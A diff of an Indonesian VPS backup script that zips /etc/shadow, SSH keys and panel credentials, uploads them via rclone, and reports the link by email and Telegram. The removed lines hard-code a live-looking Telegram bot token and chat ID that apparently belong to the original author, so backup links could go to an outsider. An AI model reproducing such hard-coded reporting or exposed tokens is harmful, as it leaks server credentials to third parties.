@@ -7,7 +7,6 @@ if [[ -r "$THEME_FILE" ]]; then
   . "$THEME_FILE"
 fi
 
-# My Telegram : https://t.me/sampiiiiuu
 # ==========================================
 # Color
 RED='\033[0;31m'
@@ -19,17 +18,72 @@ PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 LIGHT='\033[0;37m'
 # ==========================================
-export CHATID="6617783693"
-export KEY="6751589620:AAHwjP6dzZhuqeyUOdYFc6742Q1YUVF1EjM"
-export TIME="10"
-export URL="https://api.telegram.org/bot$KEY/sendMessage"
+BOT_DB="/etc/bot/.bot.db"
+CHATID="$(grep -E '^#bot# ' "$BOT_DB" 2>/dev/null | awk '{print $3}' | head -n 1)"
+KEY="$(grep -E '^#bot# ' "$BOT_DB" 2>/dev/null | awk '{print $2}' | head -n 1)"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+copy_file_if_exists() {
+	local src="$1"
+	local dst="$2"
+	if [[ -f "$src" ]]; then
+		mkdir -p "$(dirname "$dst")"
+		cp -f "$src" "$dst"
+	fi
+}
+
+copy_dir_if_exists() {
+	local src="$1"
+	local dst="$2"
+	if [[ -d "$src" ]]; then
+		mkdir -p "$(dirname "$dst")"
+		rm -rf "$dst"
+		cp -a "$src" "$dst"
+	fi
+}
+
+copy_glob_if_exists() {
+	local pattern="$1"
+	local dst_dir="$2"
+	local files=()
+
+	shopt -s nullglob
+	files=($pattern)
+	shopt -u nullglob
+
+	if [[ ${#files[@]} -eq 0 ]]; then
+		return 0
+	fi
+
+	mkdir -p "$dst_dir"
+	cp -f "${files[@]}" "$dst_dir"/
+}
+
+trim_runtime_cache() {
+	rm -rf "$BACKUP_DIR/kyt-bin/.venv" \
+				 "$BACKUP_DIR/vpnxray-webpanel/.venv" \
+				 "$BACKUP_DIR/vpnxray-me-cli-sunset/.venv" \
+				 "$BACKUP_DIR/vpnxray-webpanel/__pycache__" \
+				 "$BACKUP_DIR/vpnxray-me-cli-sunset/__pycache__" \
+				 "$BACKUP_DIR/kyt-bin/__pycache__" \
+				 "$BACKUP_DIR/vpnxray-me-cli-sunset/logs" \
+				 "$BACKUP_DIR/vpnxray-me-cli-sunset/run"
+	find "$BACKUP_DIR" -type d -name "__pycache__" -prune -exec rm -rf {} + 2>/dev/null || true
+	find "$BACKUP_DIR" -type f -name "*.pyc" -delete 2>/dev/null || true
+}
+
 clear
 if declare -F thm_title >/dev/null; then
 	thm_title "BACKUP VPS DATA"
 fi
-IP=$(curl -sS ipv4.icanhazip.com)
-domain=$(cat /etc/xray/domain)
-date=$(date +"%Y-%m-%d")
+IP="$(curl -sS ipv4.icanhazip.com 2>/dev/null || true)"
+if [[ -z "$IP" ]]; then
+	IP="$(wget -qO- ipinfo.io/ip 2>/dev/null || true)"
+fi
+[[ -n "$IP" ]] || IP="unknown-ip"
+domain="$(cat /etc/xray/domain 2>/dev/null || hostname -f 2>/dev/null || hostname 2>/dev/null || echo unknown-domain)"
+date="$(date +"%Y-%m-%d")"
 BACKUP_DIR="/root/backup"
 clear
 email=$(cat /root/email 2>/dev/null)
@@ -44,27 +98,45 @@ clear
 echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
 rm -rf "$BACKUP_DIR"
 mkdir -p "$BACKUP_DIR"
-cp /etc/passwd "$BACKUP_DIR"/
-cp /etc/group "$BACKUP_DIR"/
-cp /etc/shadow "$BACKUP_DIR"/
-cp /etc/gshadow "$BACKUP_DIR"/
-cp /etc/crontab "$BACKUP_DIR"/
-cp -r /etc/vmess/ "$BACKUP_DIR"/
-cp -r /etc/ssh/ "$BACKUP_DIR"/
-cp -r /etc/vless/ "$BACKUP_DIR"/
-cp -r /etc/trojan/ "$BACKUP_DIR"/
-cp -r /etc/limit/vmess/ "$BACKUP_DIR"/vmessquota
-cp -r /etc/limit/vless/ "$BACKUP_DIR"/vlessquota
-cp -r /etc/limit/trojan/ "$BACKUP_DIR"/trojanquota
-cp -r /etc/limit/shadowsocks/ "$BACKUP_DIR"/shadowsocksquota
-cp -r /etc/kyt/limit/vmess/ip/ "$BACKUP_DIR"/vmessip
-cp -r /etc/kyt/limit/vless/ip/ "$BACKUP_DIR"/vlessip
-cp -r /etc/kyt/limit/trojan/ip/ "$BACKUP_DIR"/trojanip
-cp -r /etc/kyt/limit/shadowsocks/ip/ "$BACKUP_DIR"/shadowsocksip
-cp -r /etc/shadowsocks/ "$BACKUP_DIR"/
-cp -r /var/lib/kyt/ "$BACKUP_DIR"/kyt
-cp -r /etc/xray "$BACKUP_DIR"/xray
-cp -r /var/www/html/ "$BACKUP_DIR"/html
+copy_file_if_exists /etc/passwd "$BACKUP_DIR/passwd"
+copy_file_if_exists /etc/group "$BACKUP_DIR/group"
+copy_file_if_exists /etc/shadow "$BACKUP_DIR/shadow"
+copy_file_if_exists /etc/gshadow "$BACKUP_DIR/gshadow"
+copy_file_if_exists /etc/crontab "$BACKUP_DIR/crontab"
+copy_dir_if_exists /etc/vmess "$BACKUP_DIR/vmess"
+copy_dir_if_exists /etc/ssh "$BACKUP_DIR/ssh"
+copy_dir_if_exists /etc/vless "$BACKUP_DIR/vless"
+copy_dir_if_exists /etc/trojan "$BACKUP_DIR/trojan"
+copy_dir_if_exists /etc/limit/vmess "$BACKUP_DIR/vmessquota"
+copy_dir_if_exists /etc/limit/vless "$BACKUP_DIR/vlessquota"
+copy_dir_if_exists /etc/limit/trojan "$BACKUP_DIR/trojanquota"
+copy_dir_if_exists /etc/limit/shadowsocks "$BACKUP_DIR/shadowsocksquota"
+copy_dir_if_exists /etc/kyt/limit/vmess/ip "$BACKUP_DIR/vmessip"
+copy_dir_if_exists /etc/kyt/limit/vless/ip "$BACKUP_DIR/vlessip"
+copy_dir_if_exists /etc/kyt/limit/trojan/ip "$BACKUP_DIR/trojanip"
+copy_dir_if_exists /etc/kyt/limit/shadowsocks/ip "$BACKUP_DIR/shadowsocksip"
+copy_dir_if_exists /etc/shadowsocks "$BACKUP_DIR/shadowsocks"
+copy_dir_if_exists /var/lib/kyt "$BACKUP_DIR/kyt"
+copy_dir_if_exists /etc/xray "$BACKUP_DIR/xray"
+copy_dir_if_exists /var/www/html "$BACKUP_DIR/html"
+
+# Backup jalur runtime bot Telegram panel (kyt + helper script).
+copy_dir_if_exists /etc/bot "$BACKUP_DIR/bot-notif"
+copy_dir_if_exists /usr/bin/kyt "$BACKUP_DIR/kyt-bin"
+copy_glob_if_exists "/usr/bin/bot-*" "$BACKUP_DIR/bot-scripts"
+copy_file_if_exists /etc/systemd/system/kyt.service "$BACKUP_DIR/kyt.service"
+
+# Backup jalur panel VPS web + me-cli.
+copy_dir_if_exists /opt/vpnxray-webpanel "$BACKUP_DIR/vpnxray-webpanel"
+copy_file_if_exists /etc/kyt/webpanel.env "$BACKUP_DIR/webpanel.env"
+copy_file_if_exists /etc/systemd/system/vpnxray-webpanel.service "$BACKUP_DIR/webpanel.service"
+copy_file_if_exists /usr/bin/user "$BACKUP_DIR/panel-user"
+copy_file_if_exists /usr/bin/password "$BACKUP_DIR/panel-password"
+copy_dir_if_exists /opt/vpnxray-me-cli-sunset "$BACKUP_DIR/vpnxray-me-cli-sunset"
+copy_dir_if_exists /usr/local/share/vpnxray/me-cli-sunset-main "$BACKUP_DIR/me-cli-sunset-main"
+
+trim_runtime_cache
+
 cd /root
 if ! zip -r "$IP-$date.zip" backup >/dev/null 2>&1; then
 echo "Gagal membuat file zip backup"
@@ -78,15 +150,23 @@ rm -f "/root/$IP-$date.zip"
 exit 1
 fi
 
-url=$(rclone link "dr:backup/$IP-$date.zip" 2>/dev/null)
+url=$(rclone link "dr:backup/$IP-$date.zip" 2>/dev/null || true)
 if [[ -z "$url" ]]; then
 echo "Gagal mendapatkan link backup dari rclone"
 rm -rf "$BACKUP_DIR"
 rm -f "/root/$IP-$date.zip"
 exit 1
 fi
-id=(`echo $url | grep '^https' | cut -d'=' -f2`)
-link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+id=""
+if [[ "$url" == *"id="* ]]; then
+	id="${url##*id=}"
+	id="${id%%&*}"
+fi
+if [[ -n "$id" ]]; then
+	link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+else
+	link="$url"
+fi
 echo -e "
 Detail Backup 
 ==================================
@@ -94,28 +174,26 @@ IP VPS        : $IP
 Link Backup   : $link
 Tanggal       : $date
 ==================================
-" | mail -s "Backup Data" $email
+" | mail -s "Backup Data" "$email" 2>/dev/null || true
 rm -rf "$BACKUP_DIR"
 rm -f "/root/$IP-$date.zip"
 clear
-CHATID="$CHATID"
-KEY="$KEY"
-TIME="$TIME"
-URL="$URL"
 TEXT="<code>==============</code>
-<code>Detail Backup </code>
+<code>Detail Backup</code>
 <code>==============</code>
 <code>DOMAIN       : ${domain}</code>
 <code>==============</code>
 <code>IP VPS       : ${IP}</code>
 <code>==============</code>
-<code>Link Backup   :</code> $link
+<code>Link Backup  :</code> $link
 <code>==============</code>
 <code>Tanggal : $date</code>
 <code>==============</code>
-<code>Silahkan copy Link dan restore di VPS baru</code>
+<code>Silahkan copy link dan restore di VPS baru</code>
 "
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+if [[ -n "$CHATID" && -n "$KEY" ]]; then
+	curl -s --max-time "$TIME" -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" "$URL" >/dev/null 2>&1 || true
+fi
 echo ""
 clear
 echo -e "
